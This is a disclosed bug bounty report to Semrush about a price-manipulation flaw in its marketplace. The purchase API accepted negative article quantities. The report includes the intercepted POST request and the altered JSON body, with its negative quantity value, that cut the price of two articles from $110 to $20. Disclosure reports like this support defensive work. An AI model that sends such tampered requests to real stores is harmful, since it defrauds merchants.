# An attacker can buy marketplace articles for lower prices as it allows for negative quantity values leading to business loss

## Report Details
- **Report ID**: 771694
- **URL**: https://hackerone.com/reports/771694
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-01-10T15:18:20.869Z
- **Disclosed**: 2020-04-02T09:35:11.080Z

## Reporter
- **Username**: yashrs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
Hi there,

When we
**Summary:** 
When someone goes to https://www.semrush.com/marketplace/offers/ and orders for articles, an attacker can pay for less than intended due to  negative quantities being allowed. 

## Steps To Reproduce:
- Go to https://www.semrush.com/marketplace/offers/
- Click on 500 Words($40) Order Now button.
- Select any two articles.
- Intercept the request:

```
POST /marketplace/api/purchases/bulk HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.semrush.com/marketplace/offers/
Content-type: application/json
Origin: https://www.semrush.com
Content-Length: 45
DNT: 1
Connection: close
Cookie: COOKIES

{"items":{"article_500":1,"article_1000":1}}
```

- The actual price should be $110 for two articles.

Change the JSON body to :

```
{"items":{"article_500":4,"article_1000":-2}}
```

- The cost will become $20 for two articles:
4 * $40- 2 * $70= $160 - $140 = $20

████

I even tried with my Virtual Card. Here is the failed payment. This is the proof that it actually charges the lowered amount:
██████████

Regards,
Yash

## Impact

An attacker can buy articles at much lower rates by exploiting this vulnerability which could cause severe business losses to Semrush

## Attachments
No attachments
